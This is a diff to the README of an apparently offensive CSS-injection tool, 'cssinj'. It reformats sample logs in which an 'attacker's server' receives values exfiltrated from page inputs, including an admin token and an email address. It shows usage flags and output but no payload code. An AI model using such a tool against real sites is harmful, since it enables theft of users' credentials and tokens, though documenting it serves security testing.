@@ -79,9 +79,9 @@ python3 -m cssinj [-h] -H HOSTNAME -p PORT -i IDENTIFIER
 [2025-03-11 02:40:55] 🛠️ Attacker's server started on 127.0.0.1:5005
 [2025-03-11 02:40:56] 🌐 Connection from ::1
 [2025-03-11 02:40:56] ⚙️ ID : 1
-[2025-03-11 02:40:56] ✅ The value exfiltrated from input is : MySecretAdminToken
-[2025-03-11 02:40:56] ✅ The value exfiltrated from input is : admin@admin.XX
-[2025-03-11 02:40:56] ✅ The value exfiltrated from input is : admin
+[2025-03-11 02:40:56] ✅ [1] - The value exfiltrated from input is : MySecretAdminToken
+[2025-03-11 02:40:56] ✅ [1] - The value exfiltrated from input is : admin@admin.XX
+[2025-03-11 02:40:56] ✅ [1] - The value exfiltrated from input is : admin
 ```
 
 #### Using a specific CSS attribute selector and a generic CSS identifier:
@@ -98,7 +98,7 @@ python3 -m cssinj [-h] -H HOSTNAME -p PORT -i IDENTIFIER
 [2025-03-11 03:06:49] 🛠️ Attacker's server started on 127.0.0.1:5005
 [2025-03-11 03:06:49] 🌐 Connection from ::1
 [2025-03-11 03:06:49] ⚙️ ID : 1
-[2025-03-11 03:06:49] ✅ The src exfiltrated from * is : XXXXXXXXXXX.XX
+[2025-03-11 03:06:49] ✅ [1] - The src exfiltrated from * is : XXXXXXXXXXX.XX
 ```
 
 ## Browser-Specific Behavior
